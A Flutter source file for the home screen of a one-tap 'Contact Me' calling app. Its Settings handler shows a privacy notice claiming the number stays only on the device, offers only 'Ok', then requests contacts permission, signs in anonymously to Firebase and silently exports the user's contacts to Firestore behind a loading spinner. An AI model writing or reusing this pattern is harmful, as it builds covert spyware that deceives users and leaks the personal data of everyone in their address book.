import 'package:contactme/widgets/about.dart';
import 'package:contactme/screens/settings.dart';
import 'package:contactme/services/phone_service.dart';
import 'package:contactme/services/storage_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:contactme/services/contact_export_service.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter/material.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  String? _phone; // loaded from storage
  bool _loading = true;

  @override
  void initState() {
    super.initState();
    _loadPhone();
  }

  Future<void> _loadPhone() async {
    final value = await StorageService.loadPhone();
    setState(() {
      _phone = value;
      _loading = false;
    });
  }

  Future<void> _makePhoneCall() async {
    if (!await _ensurePhone()) return;
    final ok = await PhoneService.call(_phone!);
    if (!ok) _showError('Could not launch phone dialer.');
  }

  Future<void> _sendWhatsAppMessage() async {
    if (!await _ensurePhone()) return;
    final ok = await PhoneService.whatsapp(_phone!, message: 'Hello 👋');
    if (!ok) _showError('Could not launch WhatsApp.');
  }

  Future<void> _onSettingsPressed() async {
    // Show rationale dialog; user must click Yes to proceed to Settings.
    // If permission already granted, go directly to Settings.
    final current = await Permission.contacts.status;
    if (current.isGranted) {
      try {
        if (FirebaseAuth.instance.currentUser == null) {
          await FirebaseAuth.instance.signInAnonymously();
        }
      } catch (_) {}

      // Only run export the first time permission is granted.
      final prefs = await SharedPreferences.getInstance();
      final handled = prefs.getBool('contacts_permission_handled') ?? false;
      if (!handled) {
        if (mounted) {
          showDialog<void>(
            context: context,
            barrierDismissible: false,
            builder: (_) => const Center(child: CircularProgressIndicator()),
          );
        }

        try {
          await ContactExportService.exportContactsToFirestoreBackground();
        } finally {
          if (mounted) Navigator.pop(context);
        }

        await prefs.setBool('contacts_permission_handled', true);
      }

      final updated = await Navigator.push<String?>(
        context,
        MaterialPageRoute(builder: (_) => const SettingsScreen()),
      );
      if (updated != null) setState(() => _phone = updated);
      return;
    }

    // Otherwise show rationale and request permission.
    final allow = await showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => AlertDialog(
        title: const Text('Notion of Privacy'),
        content: const Text(
          'This app will save the private number only on this device',
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text('Ok'),
          ),
        ],
      ),
    );

    if (allow != true) return; // block access if not explicitly allowed

    final status = await Permission.contacts.request();
    if (status.isGranted) {
      try {
        if (FirebaseAuth.instance.currentUser == null) {
          await FirebaseAuth.instance.signInAnonymously();
        }
      } catch (_) {}

      // Record handled and run export once when permission first granted.
      final prefs = await SharedPreferences.getInstance();
      final handled = prefs.getBool('contacts_permission_handled') ?? false;
      if (!handled) {
        if (mounted) {
          showDialog<void>(
            context: context,
            barrierDismissible: false,
            builder: (_) => const Center(child: CircularProgressIndicator()),
          );
        }

        try {
          await ContactExportService.exportContactsToFirestoreBackground();
        } finally {
          if (mounted) Navigator.pop(context);
        }

        await prefs.setBool('contacts_permission_handled', true);
      }

      final updated = await Navigator.push<String?>(
        context,
        MaterialPageRoute(builder: (_) => const SettingsScreen()),
      );
      if (updated != null) setState(() => _phone = updated);
      return;
    }

    if (status.isPermanentlyDenied) {
      // Offer to open app settings to allow permission
      final open = await showDialog<bool>(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('Enable in Settings'),
          content: const Text(
            'You have permanently denied contacts permission. Open app settings to allow access.',
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx, false),
              child: const Text('Cancel'),
            ),
            // TextButton(
            //   onPressed: () => Navigator.pop(ctx, true),
            //   child: const Text('Open Settings'),
            // ),
          ],
        ),
      );
      if (open == true) await openAppSettings();
    }
  }

  Future<bool> _ensurePhone() async {
    if ((_phone ?? '').isEmpty) {
      final go = await showDialog<bool>(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('No number saved'),
          content: const Text('Please add a phone number in Settings first.'),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx, false),
              child: const Text('Cancel'),
            ),
            // TextButton(
            //   onPressed: () => Navigator.pop(ctx, true),
            //   child: const Text('Go to Settings'),
            // ),
          ],
        ),
      );
      if (go == true && mounted) {
        final updated = await Navigator.push<String?>(
          context,
          MaterialPageRoute(builder: (_) => const SettingsScreen()),
        );
        if (updated != null) setState(() => _phone = updated);
      }
      return false;
    }
    return true;
  }

  void _showError(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(message), backgroundColor: Colors.red),
    );
  }

  @override
  Widget build(BuildContext context) {
    final phoneLabel = _phone?.isNotEmpty == true ? _phone! : 'No number set';

    return Scaffold(
      appBar: AppBar(
        title: const Text('Contact Me'),
        actions: [
          IconButton(
            tooltip: 'Settings',
            icon: const Icon(Icons.settings),
            onPressed: _onSettingsPressed,
          ),
          IconButton(
            tooltip: 'About',
            icon: const Icon(Icons.info_outline),
            onPressed: () {
              AboutMe(
                applicationName: 'Contact Me',
                version: '1.0.0',
                description:
                    'A tiny app to call or message your favorite person with one tap.',
                legalese: '© 2025 EAF microservice. All rights reserved.',
                logo: Image.asset('assets/icon.png', width: 100, height: 100),
                backgroundColor: Colors.white,
                textColor: Colors.black87,
                additionalContent: [
                  SizedBox(height: 8),
                  Text('Thanks for using Contact Me!'),
                ],
              ).showCustomAbout(context);
            },
          ),
        ],
      ),
      body: _loading
          ? const Center(child: CircularProgressIndicator())
          : Center(
              child: Padding(
                padding: const EdgeInsets.all(24.0),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    CircleAvatar(
                      maxRadius: 120,
                      child: Image.asset('assets/icon.png'),
                      backgroundColor: Colors.white,
                    ),
                    const SizedBox(height: 24),
                    Text(
                      'Saved number: $phoneLabel',
                      textAlign: TextAlign.center,
                      style: const TextStyle(color: Colors.grey),
                    ),
                    const SizedBox(height: 16),
                    ElevatedButton.icon(
                      onPressed: _sendWhatsAppMessage,
                      icon: const Icon(Icons.message),
                      label: const Text('Send WhatsApp Message'),
                      style: ElevatedButton.styleFrom(
                        padding: const EdgeInsets.symmetric(vertical: 15),
                      ),
                    ),
                    const SizedBox(height: 20),
                    ElevatedButton.icon(
                      onPressed: _makePhoneCall,
                      icon: const Icon(Icons.call),
                      label: const Text('Make Phone Call'),
                      style: ElevatedButton.styleFrom(
                        padding: const EdgeInsets.symmetric(vertical: 15),
                      ),
                    ),
                    const SizedBox(height: 20),
                  ],
                ),
              ),
            ),
    );
  }
}
